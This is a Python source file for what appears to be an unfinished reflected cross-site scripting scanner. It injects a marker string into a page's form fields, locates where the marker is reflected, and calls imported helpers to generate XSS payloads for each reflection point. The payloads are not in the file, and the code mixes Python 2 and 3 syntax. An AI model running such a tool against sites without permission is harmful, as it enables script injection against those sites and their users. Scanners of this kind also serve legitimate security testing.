import sys
import urllib
import requests
import re
from functools import reduce
from random import choice

from core.context import getContext
from core.payload import genPayload
from core.config import headers

test = "6ix8uzz"

if len(sys.argv) < 2:
    print("usage: python xss.py url")
    sys.exit()

url = sys.argv[1]
if "http://" not in url:
    url = "http://" + url

input_reg = '<input.*?name=[\'\"](.*?)[\'\"].*?>'

response = requests.get(url, headers=headers)

# find input elements in the response and get their respective 'name' attributes
# the assumption here is that the GET parameters submitted to the server will have
# the same as the input names
data = {}
params = re.findall(input_reg, response.text)
paramid = 0
for param in params:
    data[param] = test + str(paramid)
    paramid += 1

test_response = requests.get(url, headers=headers, params=data)
print test_response
reflection_contexts = getContext(test_response)

payloads = {}
for i in range(len(reflection_contexts)):
    print "Generating payload for {}".format(i)
    payloads[test + str(i)] = genPayload(reflection_contexts[i])

# look for test string in the response

# final_payloads = {}
# for line in test_response.text.split('\n'):
#     injection_site = filter(lambda x : x[0], [(re.match(ctx["match_str"], line), ctx["name"]) for ctx in contexts])
#     # assume that injection contexts are mutually exlcusive; that is above filter expression should only return one result
#     injection_site = next(injection_site, None)
#     if injection_site:
#         context, name = injection_site
#         if name == "quotes":
#             double_quote, single_quote = context.group(1,2)
#             index = single_quote[-1:] if single_quote else double_quote[-1:]
#             param_name = params[int(index)]
#             final_payloads[param_name] = single_quote_payload if single_quote else double_quote_payload

# # lets just use the first param
# param, payload = list(final_payloads.items())[0]
# url = url if url[-1:] == '/' else url + '/'
# url = url + "?" + param + "=" + payload
# print(url)